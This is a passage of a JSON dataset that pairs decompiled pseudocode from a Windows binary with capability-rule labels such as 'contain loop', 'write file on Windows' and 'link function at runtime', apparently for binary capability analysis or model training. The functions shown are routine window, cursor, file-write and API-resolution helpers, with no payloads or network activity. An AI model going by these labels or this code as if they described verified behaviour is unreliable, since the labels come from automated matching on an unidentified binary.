        "decompiled_code": "\nuint32_t __fastcall fcn.004367a8(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    uVar1 = 0;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return uVar1;\n        }\n        uVar1 = fcn.00413b64();\n        bVar2 = param_2 == *(uVar1 + 4);\n        uVar1 = uVar1 & 0xffffff00 | bVar2;\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 180
    },
    "004367dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004367dc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.0043fd08();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 103
    },
    "00436894": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00436894(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStackY20;\n    \n    iVar5 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStackY20 = 0x4368af;\n            piVar2 = fcn.00413b64();\n            iVar5 = *piVar2;\n        }\n        else {\n            iStackY20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 = iVar3,  iVar5 == 0 && (iVar4 != 0))) {\n                cVar1 = fcn.004367a8();\n                if (cVar1 == '\\0') {\n                    iVar3 = sub.user32.dll_GetWindow();\n                    iStackY20 = iVar4;\n                }\n                else {\n                    iVar5 = **(*(in_EAX + 4) + iStackY20 * 4);\n                    iVar3 = iVar4;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStackY20, iVar5);\n}\n",
        "token_count": 299
    },
    "004372f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004372f0(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.00437290(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 106
    },
    "00437da4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00437da4(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.004363b8(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "0043909c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043909c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004033e4();\n            if (cVar1 != '\\0') {\n                fcn.00454798();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043c7e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043c7e4(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 93
    },
    "0043d160": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043d160(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00413bc0();\n    iVar2 = *(*(in_EAX + 0x19c) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.00413b64();\n            if (*(iVar2 + 0x180) != 0) {\n                return *(iVar2 + 0x180);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "00441a78": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00441a78(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00441b0c();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 102
    },
    "00441adc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00441adc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 93
    },
    "00441af0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00441af0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.00442104();\n    while (iVar1 != 0) {\n        iVar1 = fcn.004420dc();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 86
    },
    "00441b0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.00441b0c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.00442104(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.00441b0c();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 163
    },
    "00441e5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441e5c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.004420dc();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 122
    },
    "00442030": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00442030(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 68
    },
    "00442040": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00442040(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0044202c();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.00441adc();\n        if (0 < iVar2) {\n            fcn.00442030();\n            fcn.00442040();\n        }\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0044207c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044207c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.00442004();\n        iVar3 = fcn.00441b40();\n        if (iVar2 < iVar3) {\ncode_r0x004420b0:\n            fcn.00441cec();\n            fcn.004423b8(0x443b8c, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.00442004();\n            iVar3 = fcn.00441b88();\n            if (iVar3 < iVar2) goto code_r0x004420b0;\n        }\n        fcn.0044207c();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 226
    },
    "004420e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004420e8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00441b0c();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 120
    },
    "0044237c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044237c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0044237c(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0044237c(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004432b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004432b0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.004432b0(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.004432b0(arg_8h);\n    }\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 100
    },
    "0044398c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044398c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.004420dc();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.00441b0c();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.0044202c();\n                }\n                else {\n                    fcn.00442004();\n                    fcn.0044202c();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.00442104();\n        fcn.0044398c(iVar2);\n        fcn.004420dc();\n        fcn.0044398c(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00443de4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443de4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.00441a94();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.00441b40();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.00441b0c();\n        if (cVar1 == '\\0') {\n            fcn.00443de4(arg_8h);\n        }\n    }\n    iVar2 = fcn.004420e8();\n    if (iVar2 != 0) {\n        fcn.004420e8();\n        fcn.00442040();\n    }\n    fcn.004423b8(0x443b8c, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 255
    },
    "00445c98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445c98(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004043b4(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00403408();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00403ffc();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00445f98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445f98(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00403408();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00445ff4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445ff4(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00403408();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00446058": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446058(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar1 = fcn.00403408();\n                if (iVar1 != 0) {\n                    piVar2 = fcn.00413b64();\n                    (**(*piVar2 + 0x74))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "004461ec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004461ec(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 219
    },
    "00447514": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447514(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.00413b64();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.00413a54();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00449c88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449c88(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0044b754();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.0044b764();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.00448d90();\n                }\n            }\n            else {\n                iVar2 = fcn.0044b764();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.0044b764();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0044b81c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b81c(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0044b754();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0044b764();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0044bc7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044bc7c(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0044b754();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0044b764();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0044bd10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0044bd10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "0044cd40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cd40(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0044e054": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e054(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.00413b64();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.00413b64();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "004503b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004503b0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.004026dc();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004506c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004506c0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    do {\n        iVar2 = in_EAX;\n        in_EAX = *(iVar2 + 0x30);\n    } while (in_EAX != 0);\n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "004534b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.004534b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uStack28;\n    \n    uStack28 = fcn.0043fd08(2, 0);\n    iVar1 = (***0x461fd4)();\n    iVar2 = fcn.00456f24();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456f10();\n            if (iVar1 == *(iVar3 + 4)) {\n                uStack28 = fcn.00456f10();\n                goto code_r0x0045358e;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = fcn.00456f24();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00413b64();\n            fcn.00403258();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    (**(**(*0x463bb4 + 0x58) + 8))();\n    (***0x46201c)(0, 0, fcn.00453480, *(*0x463bb4 + 0x58));\n    iVar2 = fcn.00456f24();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456f10();\n            if (iVar1 == *(iVar3 + 4)) {\n                uStack28 = fcn.00456f10();\n                break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\ncode_r0x0045358e:\n    return CONCAT44(uStack28, uStack28);\n}\n",
        "token_count": 405
    },
    "00454890": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454890(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004033e4();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.0043fd08();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00456514": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456514(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(arg_8h + -4) + 0x2f0);\n    if ((iVar2 != 0) && (iVar2 = *(iVar2 + 8),  -1 < iVar2 + -1)) {\n        do {\n            fcn.00413b64();\n            cVar1 = fcn.004458e4();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "00456ab8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456ab8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x456b7e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.004394a0();\n        fcn.00404098();\n        uVar1 = fcn.00404268();\n        fcn.00404468(uVar1);\n        fcn.004394b0();\n        iVar2 = fcn.00404268();\n        if (0 < iVar2) {\n            iVar3 = 1;\n            do {\n                if ((*(iVar3 + -1) == '\\n') || (*(iVar3 + -1) == '\\r')) {\n                    fcn.004045f4();\n                    break;\n                }\n                iVar3 = iVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0043955c();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.00452960();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x456b85;\n    uStack24 = 0x456b7d;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 405
    },
    "004570c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004570c0(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.004026dc();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "004599c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004599c4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00456f70();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.00456f5c();\n            cVar1 = fcn.0044000c();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.0043fd08();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.0043fd08();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xdc))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00459bc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00459bc0(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.00456f54();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00456f40();\n            fcn.0043a6d4(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00408348": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.00408348(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 87
    },
    "00425a04": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00425a04(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x425b68);\n    if (iVar1 != 0) {\n        *0x46396c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425b78);\n        *0x463970 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425b8c);\n        *0x463964 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425ba0);\n        *0x463968 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425bb8);\n        *0x463940 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425bd0);\n        if (*0x463940 == 0) {\n            *0x463940 = 0x4064f4;\n        }\n        *0x463944 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425be8);\n        if (*0x463944 == 0) {\n            *0x463944 = 0x40689c;\n        }\n        *0x463948 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c00);\n        if (*0x463948 == 0) {\n            *0x463948 = 0x406644;\n        }\n        *0x46394c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c18);\n        if (*0x46394c == 0) {\n            *0x46394c = 0x406634;\n        }\n        *0x463950 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c30);\n        if (*0x463950 == 0) {\n            *0x463950 = 0x40663c;\n        }\n        *0x463954 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c44);\n        if (*0x463954 == 0) {\n            *0x463954 = 0x406854;\n        }\n        *0x463958 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c58);\n        if (*0x463958 == 0) {\n            *0x463958 = 0x40684c;\n        }\n        *0x46395c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x425c70);\n        if (*0x46395c == 0) {\n            *0x46395c = 0x40685c;\n        }\n    }\n    return;\n}\n",
        "token_count": 599
    },
    "0045a740": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0045a740(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x45a764);\n    if (iVar1 != 0) {\n        *0x461cd4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x45a770);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0040adc8": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040adc8(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < uVar1) {\n        param_1 = uVar1 & 0xffffff00 | in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 99
    },
    "00405d78": {
        "rules": [
            "get thread local storage value"
        ],
